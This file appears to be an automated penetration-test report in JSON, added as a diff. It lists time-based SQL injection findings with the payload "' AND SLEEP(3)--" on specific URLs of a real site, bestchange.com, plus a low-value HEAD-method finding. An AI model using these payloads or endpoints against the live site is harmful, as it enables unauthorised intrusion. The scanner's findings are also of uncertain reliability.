@@ -1,0 +1,41 @@
+{
+  "target": "https://bestchange.com",
+  "test_date": "2025-12-07T22:03:06.247306",
+  "test_type": "Advanced Penetration Testing",
+  "findings": [
+    {
+      "type": "SQL Injection (Time-based)",
+      "severity": "High",
+      "url": "https://www.bestchange.com/index.php?mt=rates",
+      "parameter": "mt",
+      "payload": "' AND SLEEP(3)--",
+      "evidence": "Response delayed by 3.97 seconds",
+      "confidence": 75
+    },
+    {
+      "type": "SQL Injection (Time-based)",
+      "severity": "High",
+      "url": "https://www.bestchange.com/index.php?mt=stats",
+      "parameter": "mt",
+      "payload": "' AND SLEEP(3)--",
+      "evidence": "Response delayed by 4.00 seconds",
+      "confidence": 75
+    },
+    {
+      "type": "HTTP Method HEAD Allowed",
+      "severity": "Medium",
+      "url": "https://bestchange.com/click.php?id=1",
+      "method": "HEAD",
+      "status": 200,
+      "evidence": "Method HEAD returns 200",
+      "confidence": 100
+    }
+  ],
+  "summary": {
+    "total": 3,
+    "critical": 0,
+    "high": 2,
+    "medium": 1,
+    "info": 0
+  }
+}
